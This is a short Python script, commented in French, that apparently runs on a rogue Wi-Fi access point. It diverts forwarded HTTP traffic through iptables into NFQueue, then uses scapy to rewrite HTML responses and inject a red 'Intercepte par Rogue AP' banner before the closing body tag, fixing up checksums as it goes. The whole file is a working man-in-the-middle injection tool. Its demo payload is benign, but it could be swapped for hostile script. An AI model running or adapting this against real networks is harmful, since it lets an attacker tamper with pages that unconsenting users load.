#!/usr/bin/env python3
# Script NFQueue - intercepte et modifie les paquets HTTP

import sys
from netfilterqueue import NetfilterQueue
from scapy.all import IP, TCP, Raw
import subprocess

total = 0
modifies = 0

def modifier_paquet(paquet):
    # compte les paquets
    global total, modifies
    total += 1

    try:
        pkt = IP(paquet.get_payload())

        # si c'est du HTTP
        if pkt.haslayer(TCP) and pkt.haslayer(Raw):
            payload = pkt[Raw].load

            # si c'est une reponse HTTP avec du HTML
            if pkt[TCP].sport == 80 and b'text/html' in payload:
                # on injecte un message dans la page
                injection = b'<h1 style="color:red">Intercepte par Rogue AP</h1>'
                nouveau = payload.replace(b'</body>', injection + b'</body>')

                if nouveau != payload:
                    pkt[Raw].load = nouveau
                    # recalcul des checksums
                    del pkt[IP].len
                    del pkt[IP].chksum
                    del pkt[TCP].chksum
                    paquet.set_payload(bytes(pkt))
                    modifies += 1
                    print(f"[+] Paquet modifie ! ({pkt[IP].src} -> {pkt[IP].dst})")

    except Exception:
        pass

    paquet.accept()

def main():
    print("[*] NFQueue demarre - interception HTTP...")

    # regles iptables pour rediriger vers NFQueue
    subprocess.run("iptables -I FORWARD -p tcp --dport 80 -j NFQUEUE --queue-num 1".split())
    subprocess.run("iptables -I FORWARD -p tcp --sport 80 -j NFQUEUE --queue-num 1".split())
    print("[+] Regles iptables configurees")

    nfq = NetfilterQueue()
    try:
        nfq.bind(1, modifier_paquet)
        print("[*] En attente de paquets...")
        nfq.run()
    except KeyboardInterrupt:
        # stats a la fin
        print(f"\n[*] Total paquets : {total}")
        print(f"[*] Paquets modifies : {modifies}")
    finally:
        nfq.unbind()
        # nettoyage iptables
        subprocess.run("iptables -D FORWARD -p tcp --dport 80 -j NFQUEUE --queue-num 1".split())
        subprocess.run("iptables -D FORWARD -p tcp --sport 80 -j NFQUEUE --queue-num 1".split())
        print("[+] Regles iptables nettoyees")

if __name__ == "__main__":
    if __import__('os').geteuid() != 0:
        print("[!] Lance avec sudo")
        sys.exit(1)
    main()
